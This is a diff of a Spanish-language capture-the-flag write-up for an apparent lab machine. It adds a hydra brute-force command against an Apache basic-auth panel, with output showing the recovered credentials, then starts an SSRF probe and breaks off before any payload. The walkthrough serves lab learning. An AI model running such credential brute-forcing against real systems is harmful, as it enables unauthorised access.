@@ -178,23 +178,75 @@ Enunciado :
   - Cargamos los subdominios en el puerto 80, no conseguimos nada.
 
   - Cargamos el subdominio internal.ironcorp.me
-    
       - Puerto 8080 ---> Muestra el panel Dashtreme Admin , nada interesante lo mismo.
-        
       - Puerto 11025 --> Muestra un  Access forbidden! Error 403
     
   - Cargamos el subdominio admin.ironcorp.me
-    
       - Puerto 8080 ---> Muestra el panel Dashtreme Admin , nada interesante lo mismo.
-        
-      - Puerto 11025 --> Muestra un panel de autenticacion basica
+      - Puerto 11025 --> Muestra un panel de autenticacion basica de Apache(este puerto corre un  servicio Apache httpd 2.4.41)
         
         ![image](https://github.com/Esevka/CTF/assets/139042999/22d2d26b-7248-446d-b002-ca1071e8786d)
 
-        Info: Como Funciona la autenticacion Basica en Apache.
-
+        Info: Autenticacion Basica en Apache.
         https://www.zeppelinux.es/autenticacion-basic-en-apache/#google_vignette
+        
+        Ataque fuerza bruta contra Apache(Autenticacion Basica).
+        Para el ataque utilizaremos la herramienta hydra y unos diccionarios de usuarios y passwords de seclist, probaremos suerte.
 
+            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/iron_corp]
+            └─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt "admin.ironcorp.me" -s 11025 http-get -f -V 
+            Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes
+            
+            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-04 08:34:09
+            [WARNING] You must supply the web page as an additional option or via -m, default path set to /
+            [DATA] max 16 tasks per 1 server, overall 16 tasks, 17833 login tries (l:17/p:1049), ~1115 tries per task
+            [DATA] attacking http-get://admin.ironcorp.me:11025/
+            [ATTEMPT] target admin.ironcorp.me - login "root" - pass "------" - 1 of 17833 [child 0] (0/0)
+            [ATTEMPT] target admin.ironcorp.me - login "root" - pass "0" - 2 of 17833 [child 1] (0/0)
+            [.......]
+            [ATTEMPT] target admin.ironcorp.me - login "admin" - pass "print" - 1805 of 17833 [child 12] (0/0)
+            [ATTEMPT] target admin.ironcorp.me - login "admin" - pass "private" - 1806 of 17833 [child 10] (0/0)
+            [11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
+            [STATUS] attack finished for admin.ironcorp.me (valid pair found)
+            1 of 1 target successfully completed, 1 valid password found
+            Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-04 08:35:01
+        
+        Despues de un minuto obtenemos credenciales validas para nuestro panel ---> admin:password123
+
+## Obtenemos session en la maquina victima mediante SSRF
+
+Nos logueamos con las credenciales validas y obtenemos acceso a una web que nos permite realizar consultas(no sabemos de que tipo)
+
+![image](https://github.com/Esevka/CTF/assets/139042999/ad3cb8e7-e031-4a89-8f2b-e3f3a6df74e1)
+
+--Probamos a realizar multiples consultas para ver como funciona esto.
+
+- Enviamos un string y obtenemos lo siguiente.
+
+  La almohadilla en final de la url me llama la atencion.
+
+  ![image](https://github.com/Esevka/CTF/assets/139042999/0ea9c3ed-40c5-42fb-804b-3080d3222256)
+
+  NOTA:
+  
+      El símbolo "#" en una URL generalmente se utiliza para marcar una parte específica de una página web, lo que se conoce como "fragmento".
+      Los fragmentos se utilizan para señalar una ubicación específica en una página web, y cuando alguien accede a la URL con el fragmento,
+      el navegador web buscará ese fragmento en la página y si está presente se desplazará automáticamente hasta esa parte de la página.
+    
+      Si tienes una URL como "http://ejemplo.com/pagina#", al acceder a esa URL, el navegador cargará la página "pagina" en "ejemplo.com",
+      pero no realizará ningún desplazamiento automático ni realizará ninguna acción basada en el fragmento,
+      ya que no se especifica un fragmento concreto después de la almohadilla.
+
+  Por lo que esto nos da a entender, que podriamos intentar cargar una url en la query y ver si nos muestra su contenido.
+
+- Cargamos url 
+  
+
+    
+
+
+
+        
 
 
 
